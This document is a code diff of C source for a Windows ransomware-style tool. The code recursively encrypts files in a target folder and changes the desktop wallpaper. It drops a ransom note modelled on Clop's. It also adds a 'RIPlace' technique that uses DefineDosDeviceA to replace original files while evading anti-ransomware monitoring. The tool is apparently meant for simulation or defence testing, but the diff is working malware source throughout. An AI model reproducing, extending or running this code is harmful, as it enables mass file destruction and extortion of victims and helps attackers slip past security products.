@@ -1,4 +1,4 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <wincrypt.h>
 #include <stdio.h>
 
@@ -15,7 +15,7 @@
 int mode = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined
 int seq = 0;
 
-int crypt(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
+int crypt_content(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
 	CHAR key[KEY_LEN];
 	for (int i = 0; i < KEY_LEN; i++) {
 		key[i] = i;
@@ -95,7 +95,7 @@ int crypt(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
 		//printf("Move WriteCurrentPosition.QuadPart: %d\n", WriteCurrentPosition.QuadPart);
 		SetFilePointerEx(hOutFile, WriteCurrentPosition, &WriteCurrentPosition, FILE_CURRENT);
 		//printf("WriteCurrentPosition.QuadPart: %d\n", WriteCurrentPosition.QuadPart);
-		
+
 		if (ReadCurrentPosition.QuadPart > file_pointer_offset) {
 
 			if (mode == ENCRYPTION_MODE) {
@@ -114,7 +114,7 @@ int crypt(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
 			}
 		}
 
-		
+
 		if (!WriteFile(hOutFile, pbData, out_len, &written, NULL)) {
 			error_id = GetLastError();
 			printf("Error in WriteFile: %x\n", error_id);
@@ -131,11 +131,20 @@ int crypt(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
 }
 
 
-int file_io(char* in_file)
+int crypt_file(char* in_file)
 {
-	char* out_file;
+	HANDLE hInpFile;
+	HANDLE hOutFile;
+
+	const char* dosdevPath = R"(\\.\RIPlace)";
+	const char* dosdevName = "RIPlace";
+
+	char* out_file = 0;
 	char* ext = strrchr(in_file, '.');
-	char* out_file_ext;
+	char* out_file_ext = 0;
+	char riplace_file[0x100] = { 0 };
+
+
 
 	if (mode == -1)
 		mode = strcmp(ext, CRYPTO_EXT) & 1;
@@ -146,17 +155,19 @@ int file_io(char* in_file)
 		out_file = (char*)malloc(strlen(in_file) + CRYPTO_EXT_LEN + 1);
 		strcpy(out_file, in_file);
 		strcat(out_file, CRYPTO_EXT);
-	} else {
+	}
+	else {
 		out_file = _strdup(in_file);
 		out_file_ext = strrchr(out_file, '.');
 		*out_file_ext = '\0';
 	}
-	//printf("in_file: %s\n", in_file);
+	if (seq == 3) {
+		snprintf(riplace_file, sizeof(riplace_file), "\\??\\%s", in_file);
+	}
 
-	HANDLE hInpFile;
-	HANDLE hOutFile;
+
 	/*
-		Seq 0: two files
+		Seq 0: write the new file and delete the original file
 	*/
 	if (seq == 0) {
 		hInpFile = CreateFileA(in_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN | FILE_FLAG_DELETE_ON_CLOSE, NULL);
@@ -169,12 +180,12 @@ int file_io(char* in_file)
 			printf("Output file cannot be opened\n");
 			return false;
 		}
-		crypt(hInpFile, hOutFile, 4096);
+		crypt_content(hInpFile, hOutFile, 4096);
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
 	}
 	/*
-		Seq 1: overwrite file
+		Seq 1: overwrite the original file and rename
 	*/
 	if (seq == 1) {
 		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
@@ -182,11 +193,12 @@ int file_io(char* in_file)
 			printf("Input file cannot be opened\n");
 			return false;
 		}
-		crypt(hInpFile, hInpFile, 4096);
+		crypt_content(hInpFile, hInpFile, 4096);
 		CloseHandle(hInpFile);
+		MoveFileExA(in_file, out_file, MOVEFILE_REPLACE_EXISTING);
 	}
 	/*
-		Seq 2: two files and memset 0
+		Seq 2: move the new file to the original file
 	*/
 	if (seq == 2) {
 		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
@@ -199,23 +211,55 @@ int file_io(char* in_file)
 			printf("Output file cannot be opened\n");
 			return false;
 		}
-		crypt(hInpFile, hOutFile, 4096);
-		crypt(hInpFile, hInpFile, 4096);
+		crypt_content(hInpFile, hOutFile, 4096);
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
+		CopyFileA(out_file, in_file, 0);
 	}
-	
+
+	/*
+		Seq 3: RIPlace - move the new file to the original file by DefineDosDeviceA
+		https://github.com/Nyotron/RIPlacePoC/blob/master/RIPlacePoC.cpp
+	*/
+	if (seq == 3) {
+		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+		if (hInpFile == INVALID_HANDLE_VALUE) {
+			printf("Input file cannot be opened\n");
+			return false;
+		}
+		hOutFile = CreateFileA(out_file, GENERIC_WRITE, 0, 0, CREATE_NEW, 0, 0);
+		if (hOutFile == INVALID_HANDLE_VALUE) {
+			printf("Output file cannot be opened\n");
+			return false;
+		}
+		crypt_content(hInpFile, hOutFile, 4096);
+		CloseHandle(hInpFile);
+		CloseHandle(hOutFile);
+
+
+		printf("[!] RIPlace: %s\n", riplace_file);
+		if (!DefineDosDeviceA(DDD_REMOVE_DEFINITION, dosdevName, 0)) {
+			printf("Error in DefineDosDeviceA DDD_REMOVE_DEFINITION: %x\n", GetLastError());
+		}
+		if (!DefineDosDeviceA(DDD_RAW_TARGET_PATH, dosdevName, riplace_file)) {
+			printf("Error in DefineDosDeviceA DDD_RAW_TARGET_PATH: %x\n", GetLastError());
+		}
+		if (!MoveFileExA(out_file, dosdevPath, MOVEFILE_REPLACE_EXISTING)) {
+			printf("Error in MoveFileExA: %llx\n", GetLastError());
+		}
+		
+		if (!DefineDosDeviceA(DDD_REMOVE_DEFINITION, dosdevName, 0)) {
+			printf("Error in DefineDosDeviceA DDD_REMOVE_DEFINITION: %x\n", GetLastError());
+		}
+
+	}
 
 	free(out_file);
-
-	//Deleting original file
-	//if (!DeleteFileA(in_file))
-	//	printf("ERROR: couldn't delete %s\n", in_file);
 	return true;
 }
 
 
-void files_tree(const char* folder) {
+void search_files_n_crypt(const char* folder) {
 
 	char wildcard[MAX_PATH];
 	sprintf(wildcard, "%s\\*", folder);
@@ -232,21 +276,20 @@ void files_tree(const char* folder) {
 			continue;
 
 		char path[MAX_PATH];
-		sprintf(path, "%s\\%s", folder, fd.cFileName);
+		sprintf(path, "%s%s", folder, fd.cFileName);
 		printf("File: %s\n", path);
 
 		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
-			files_tree(path);
+			search_files_n_crypt(path);
 
-		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
-			file_io(path);
+		crypt_file(path);
 
 	} while (FindNextFileA(handle, &fd));
 
 	FindClose(handle);
 }
 
-BOOL DirectoryExists(LPCSTR szPath)
+BOOL is_folder_exist(LPCSTR szPath)
 {
 	DWORD dwAttrib = GetFileAttributesA(szPath);
 
@@ -254,17 +297,7 @@ BOOL DirectoryExists(LPCSTR szPath)
 		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
 }
 
-/*
-int main() {
-	CHAR ori_file[MAX_FILEPATH_LEN] = "C:/Users/hank_k_chen/Desktop/test.txt";
-	CHAR enc_file[MAX_FILEPATH_LEN] = "C:/Users/hank_k_chen/Desktop/test2.txt";
-	mode = DECRYPTION_MODE;
-	crypt(enc_file, ori_file);
-
-	return 0;
-}
-*/
-char RansomNote[] = 
+char RansomNote[] =
 "Your network has been penetrated. \n\
 All files on each host in the network have been encrypted with a strong algorithm.\n\
 Backups were either encrypted or deleted or backup disks were formatted.\n\
@@ -297,7 +330,7 @@ The final price depends on how fast you write to us.\n\
 \n\
 Clop";
 
-int DropNote(char* filepath) {
+int drop_note(char* filepath) {
 	DWORD written = 0;
 	HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -315,35 +348,41 @@ int main(int argc, char* argv[]) {
 		printf("[-] Usage: tool.exe <mode> <folder>");
 		return -1;
 	}
-	printf("[+] argument - mode: %s \n", argv[1]);
-	printf("[+] argument - file I/O sequence: %s \n", argv[2]);
-	printf("[+] argument - folder: %s \n", argv[3]);
+	printf("[+] arg1 - mode: %s \n", argv[1]);
+	printf("[+] arg2 - file I/O sequence: %s \n", argv[2]);
+	printf("[+] arg3 - folder: %s \n", argv[3]);
 	mode = atoi(argv[1]);
 	seq = atoi(argv[2]);
 
-	if (argv[4]) {
+	if (argc > 4) {
+		printf("[+] arg4 - wallpaper: %s \n", argv[4]);
 		bool status = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)argv[4], SPIF_UPDATEINIFILE);
 	}
 
-	if (argv[5]) {
-		DropNote(argv[5]);
+	if (argc > 5) {
+		printf("[+] arg5 - ransom note: %s \n", argv[5]);
+		drop_note(argv[5]);
 	}
+
 
 	char* path = { 0x0 };
 	int path_len = 0;
-	if (DirectoryExists(argv[3])) {
+	if (is_folder_exist(argv[3])) {
 		path = (char*)malloc(strlen(argv[3]) + 1);
 		strcpy(path, argv[3]);
 	}
+	/*
 	else {
+		printf("[x] Targeted folder doesn't exist. Let's encrypt Desktop!\n");
 		char* home_path = getenv("USERPROFILE");
 		const char* folder_desktop = "\\Desktop";
 		path = (char*)malloc(strlen(home_path) + strlen(folder_desktop) + 1);
 		strcpy(path, home_path);
 		strcat(path, folder_desktop);
 	}
-	printf("[+] Target Folder: %s\n", path);
-	files_tree(path);
+	*/
+	printf("[+] Root Folder: %s\n", path);
+	search_files_n_crypt(path);
 
 	free(path);
 
